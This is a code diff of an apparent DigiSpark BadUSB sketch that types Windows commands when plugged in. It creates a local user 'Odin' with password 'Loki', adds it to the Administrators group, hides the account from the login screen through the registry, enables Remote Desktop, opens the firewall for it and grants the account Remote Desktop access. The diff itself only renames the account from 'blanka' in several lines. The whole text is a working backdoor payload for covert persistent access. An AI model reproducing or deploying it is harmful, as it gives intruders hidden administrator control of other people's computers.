@@ -26,15 +26,15 @@ void loop() {
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("net user Odin Loki /ADD");//adding user
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("net localgroup Administrators blanka /ADD");//adding user to admin group
+  DigiKeyboard.println("net localgroup Administrators Odin /ADD");//adding user to admin group
   DigiKeyboard.delay(500);
-  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));//Hiding user from login screen
+  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v Odin /t REG_DWORD /d 0 /f"));//Hiding user from login screen
   DigiKeyboard.delay(500);
   DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));//Turning Remote desktop
   DigiKeyboard.delay(500);
   DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));//Allowing remote desktop through firewall
   DigiKeyboard.delay(500);
-  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");//adding created user to remote desktop group
+  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" Odin /add");//adding created user to remote desktop group
   DigiKeyboard.delay(500);  
   DigiKeyboard.println("exit");//adding created user to remote desktop group
   DigiKeyboard.delay(500);
